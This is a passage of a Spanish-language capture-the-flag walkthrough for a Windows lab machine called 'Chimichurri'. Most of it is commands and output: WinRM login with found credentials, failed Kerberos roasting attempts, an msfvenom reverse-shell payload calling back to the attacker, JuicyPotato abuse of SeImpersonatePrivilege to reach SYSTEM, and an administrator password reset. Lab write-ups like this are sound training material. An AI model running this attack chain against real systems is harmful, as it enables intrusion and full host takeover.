Si recordamos el **escaneo de nmap**, vimos activo el **puerto 5985** que indica que está activo el **servicio WinRM**. Así que vamos a probar si las credenciales sirven para este servicio:
```bash
crackmapexec winrm 192.168.1.50 -u 'hacker' -p 'Perico69'
SMB         192.168.1.50   5985   CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 (name:CHIMICHURRI) (domain:chimichurri.thl)
HTTP        192.168.1.50   5985   CHIMICHURRI      [*] http://192.168.1.50:5985/wsman
WINRM       192.168.1.50   5985   CHIMICHURRI      [+] chimichurri.thl\hacker:Perico69 (Pwn3d!)
```
Genial, entonces podemos usar **evil-winrm** para poder conectarnos a la máquina víctima.

Probemos:
```bash
evil-winrm -i 192.168.1.50 -u 'hacker' -p 'Perico69'
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents> whoami
chimichurri0\hacker
```
Listo, estamos dentro.

Lo curioso, es que no podremos ver la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\hacker\Desktop> type user.txt
Access to the path 'C:\Users\hacker\Desktop\user.txt' is denied.
At line:1 char:1
+ type user.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\hacker\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
Quizá podamos verla cuando nos convirtamos en administrador.

### Opcional: Aplicando AS-REP Roasting Attack y Kerberoasting Attack (Ambos Fallan) {#KerberosAttacks}

Esto lo pudimos haber hecho antes, pero era mejor esperarse.

Lo primero será tratar de ver si era posible aplicar el **AS-REP Roasting Attack**, usando el **usuario hacker** sin su contraseña:
```bash
impacket-GetNPUsers chimichurri.thl/hacker -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[-] User hacker doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Pero no funciona.

Ahora, como ya tenemos su contraseña, podemos intentarlo:
```bash
impacket-GetNPUsers chimichurri.thl/hacker:Perico69
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
No entries found!
```
Igual no funcionó.

Por último, podemos probar si podemos aplicar el **Kerberoasting Attack**:
```bash
impacket-GetUserSPNs chimichurri.thl/hacker:Perico69
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```
Nada tampoco.

Parece que no podremos hacer más contra el **servicio Kerberos**.

## Post Explotación {#Post}

### Escalando Privilegios con Juicy Potato {#JuicyPotato}

Al ver los privilegios de nuestro usuario, podemos ver un privilegio interesante:
```batch
*Evil-WinRM* PS C:\Users\hacker\Desktop> whoami /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
```
Parece que no será necesario usar **BloodHound** esta vez.

Podemos descargar **Juicy Potato** del siguiente link:
* <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank">Repositorio de ohpe: Juicy Potato - Releases</a>

Y como ya tenemos una sesión de **evil-winrm**, podemos cargarlo directamente, si lo guardamos en nuestro directorio de trabajo:

```batch
*Evil-WinRM* PS C:\Users\hacker\Desktop> upload JuicyPotato.exe
                                        
Info: Uploading /../TheHackersLabs/Chimichurri/content/JuicyPotato.exe to C:\Users\hacker\Desktop\JuicyPotato.exe
                                        
Data: 463528 bytes of 463528 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\hacker\Desktop> dir

    Directorio: C:\Users\hacker\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2025   8:13 PM         347648 JuicyPotato.exe
-a----        6/30/2024   7:19 PM             15 perico.txt
-a----        6/27/2024  12:57 PM             29 user.txt
```
Ahí lo tenemos.

Abrimos una **netcat** en nuestra máquina usando **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```
Ahora, necesitamos usar un binario de **netcat** que nos permita mandar la conexión hacia nuestra **netcat** o crear y usar una **Reverse Shell**.

En mi caso voy a crear y usar una **Reverse Shell**. La creamos con **msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```
Listo, creado.

Carguémosla a nuestra sesión de **evil-winrm**:

```batch
*Evil-WinRM* PS C:\Users\hacker\Desktop> upload shell.exe
                                        
Info: Uploading /../TheHackersLabs/Chimichurri/content/shell.exe to C:\Users\hacker\Desktop\shell.exe
                                        
Data: 98400 bytes of 98400 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\hacker\Desktop> dir

    Directorio: C:\Users\hacker\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2025   8:13 PM         347648 JuicyPotato.exe
-a----        6/30/2024   7:19 PM             15 perico.txt
-a----        1/23/2025   8:15 PM          73802 shell.exe
-a----        6/27/2024  12:57 PM             29 user.txt
```
Con todo esto listo, ya podemos usar **Juicy Potato**.

Ejecutémoslo:
```batch
*Evil-WinRM* PS C:\Users\hacker\Desktop> ./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 443 -a "/c C:\Users\hacker\Desktop\shell.exe"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
No fue necesario usar un **CLSID** específico.

Y revisando nuestra **netcat**, ya seremos el **usuario Administrador**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.50] 54684
Microsoft Windows [Versi�n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
whoami
nt authority\system
```

El problema es que aún no podremos ver las flags:

```batch
C:\Users\hacker\Desktop>type user.txt
type user.txt
Acceso denegado.

C:\Users\Administrador\Desktop>type root.txt
type root.txt
Acceso denegado.
```
Por alguna razón, si cambiamos la contraseña del **usuario administrador**, ya nos dejará ver las flags.

Cambiemos la contraseña del administrador:
```batch
C:\Users\Administrador\Desktop> net user Administrador hackeado123$!
Se ha completado el comando correctamente.
```

Y nos conectamos con **evil-winrm**:
```batch
evil-winrm -i 192.168.1.50 -u 'Administrador' -p 'hackeado123$!'
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrador\Documents>
```
Ahora sí, podremos ver las flags y con esto, terminamos la máquina.
